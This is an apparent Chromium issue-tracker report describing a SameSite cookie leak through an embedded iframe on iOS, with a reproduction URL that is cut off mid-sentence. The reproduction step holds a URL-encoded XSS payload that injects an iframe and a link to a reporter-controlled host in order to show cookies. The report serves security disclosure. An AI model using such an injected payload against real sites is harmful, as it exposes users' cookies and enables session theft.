# SameSite cookies leak via embedded browsing context

| Field | Value |
|-------|-------|
| **Issue ID** | [40057831](https://issues.chromium.org/issues/40057831) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>Network>Cookies |
| **Platforms** | iOS |
| **Reporter** | pr...@gmail.com |
| **Assignee** | bi...@chromium.org |
| **Created** | 2021-11-05 |
| **Bounty** | $500.00 |

## Description

Steps to reproduce the problem:
### Reproduction Steps
1. Visit https://cm2.pw/cookies?url=/?xss=%3Ciframe+src=%22https://egesuite.net/?q=%3Ca+href=//raw.cm2.pw%3EDUMP%22+style=%22height:750px;width:750px%22%3E%3C/iframe%3E

2. Click on DUMP
3. Notice cookies which include also includes Lax & S

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40057831)*
